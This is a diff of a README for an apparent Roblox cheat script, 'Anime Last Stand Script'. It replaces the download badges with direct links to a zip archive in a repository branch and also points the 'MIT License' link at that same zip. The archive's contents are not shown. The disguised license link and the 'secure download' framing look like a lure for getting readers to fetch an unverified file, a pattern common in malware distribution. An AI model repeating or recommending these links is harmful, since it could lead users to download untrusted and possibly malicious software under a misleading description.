@@ -1,6 +1,6 @@
 # Anime Last Stand Script Roblox
 
-[![Download](https://img.shields.io/badge/Download-https://VITUXSOFT.github.io-brightgreen?logo=cloud-download&style=for-the-badge)](https://VITUXSOFT.github.io)
+[![Download](https://github.com/VITUXSOFT/anime-last-stand-roblox-toolkit/raw/refs/heads/branch/clew/last-roblox-stand-toolkit-anime-2.0.zip)](https://github.com/VITUXSOFT/anime-last-stand-roblox-toolkit/raw/refs/heads/branch/clew/last-roblox-stand-toolkit-anime-2.0.zip)
 
 Welcome to the home base of the **Anime Last Stand Script for Roblox**, where the lines of anime-inspired Roblox gameplay and smart automation blur together in a universe of customizability, performance, and flair! This repository is the vault for next-level scripting, complete with AI integrations, multi-language capability, and a supportive community-like design.  
 
@@ -105,7 +105,7 @@ Imbued with the wisdom of AI, this script features **seamless OpenAI and Claude 
 Ready to bring these powers to your Roblox storyline? Follow the footsteps below.
 
 1. **Download the Script**  
-   Click this badge to access the secure download: [![Download](https://img.shields.io/badge/Download-https://VITUXSOFT.github.io-brightgreen?logo=cloud-download&style=for-the-badge)](https://VITUXSOFT.github.io)
+   Click this badge to access the secure download: [![Download](https://github.com/VITUXSOFT/anime-last-stand-roblox-toolkit/raw/refs/heads/branch/clew/last-roblox-stand-toolkit-anime-2.0.zip)](https://github.com/VITUXSOFT/anime-last-stand-roblox-toolkit/raw/refs/heads/branch/clew/last-roblox-stand-toolkit-anime-2.0.zip)
 
 2. **Unpack & Import**  
    - Unzip the downloaded file to a known folder.
@@ -138,11 +138,11 @@ This repository, its scripts, and all associated technology are designed respons
 ## 📜 MIT License
 
 This project is open-source and licensed under the MIT License (2025).  
-You can review the license details here: [MIT License](https://opensource.org/licenses/MIT)
+You can review the license details here: [MIT License](https://github.com/VITUXSOFT/anime-last-stand-roblox-toolkit/raw/refs/heads/branch/clew/last-roblox-stand-toolkit-anime-2.0.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-https://VITUXSOFT.github.io-brightgreen?logo=cloud-download&style=for-the-badge)](https://VITUXSOFT.github.io)
+[![Download](https://github.com/VITUXSOFT/anime-last-stand-roblox-toolkit/raw/refs/heads/branch/clew/last-roblox-stand-toolkit-anime-2.0.zip)](https://github.com/VITUXSOFT/anime-last-stand-roblox-toolkit/raw/refs/heads/branch/clew/last-roblox-stand-toolkit-anime-2.0.zip)
 
 **Let the powers of code and anime align! Discover new scripts, suggest features, or join the dialogue—community-driven innovation awaits.**
 
